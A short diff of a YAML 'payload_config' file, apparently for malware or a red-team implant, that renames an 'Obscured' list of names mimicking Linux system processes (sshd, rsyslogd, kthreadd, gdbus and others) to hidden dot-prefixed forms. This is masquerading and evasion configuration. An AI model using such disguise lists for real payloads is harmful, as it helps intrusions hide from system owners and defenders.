@@ -2,13 +2,13 @@
 payload_config:
   names:
     Obscured:
-      - sshd
-      - libexec
-      - rsyslogd
-      - top
-      - kthreadd
-      - deferwq
-      - tmp
-      - atop
-      - gmain
-      - gdbus
+      - .sshd
+      - .libexec
+      - .rsyslogd
+      - .top
+      - .kthreadd
+      - .deferwq
+      - .tmp
+      - .atop
+      - .gmain
+      - .gdbus
